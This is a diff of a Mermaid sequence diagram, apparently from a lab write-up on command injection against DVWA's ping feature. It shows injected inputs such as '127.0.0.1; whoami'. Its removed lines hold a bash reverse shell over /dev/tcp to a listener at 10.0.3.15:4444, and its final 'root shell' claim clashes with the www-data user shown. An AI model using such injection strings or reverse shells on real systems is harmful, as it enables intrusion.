@@ -118,20 +118,20 @@ sequenceDiagram
     actor Attacker
     participant DVWA as DVWA Ping Feature
     participant Shell as OS Shell
-    participant Kali as Attacker Listener<br/>10.0.3.15:4444
-    
-    Attacker->>DVWA: Input: 127.0.0.1; whoami
-    DVWA->>Shell: shell_exec("ping -c 4 127.0.0.1; whoami")
+    participant Kali as Attacker Listener
+
+    Attacker->>DVWA: Input 127.0.0.1; whoami
+    DVWA->>Shell: "shell_exec(ping -c 4 127.0.0.1; whoami)"
     Shell-->>DVWA: www-data
     DVWA-->>Attacker: Ping + www-data
-    
-    Attacker->>DVWA: Input: 127.0.0.1; id
-    DVWA->>Shell: shell_exec("ping -c 4 127.0.0.1; id")
-    Shell-->>DVWA: uid=33www-datagid=33www-data
+
+    Attacker->>DVWA: Input 127.0.0.1; id
+    DVWA->>Shell: "shell_exec(ping -c 4 127.0.0.1; id)"
+    Shell-->>DVWA: uid=33www-data gid=33www-data
     DVWA-->>Attacker: Ping + uid/gid
-    
-    Attacker->>DVWA: Input: 127.0.0.1; bash -i >& /dev/tcp/10.0.3.15/4444 0>&1
-    DVWA->>Shell: shell_exec("ping ... ; reverse shell cmd")
+
+    Attacker->>DVWA: Input 127.0.0.1; reverse shell
+    DVWA->>Shell: "shell_exec(ping ... ; reverse shell)"
     Shell->>Kali: TCP connection on port 4444
     Kali-->>Shell: Interactive bash shell
     Kali->>Attacker: Root shell access
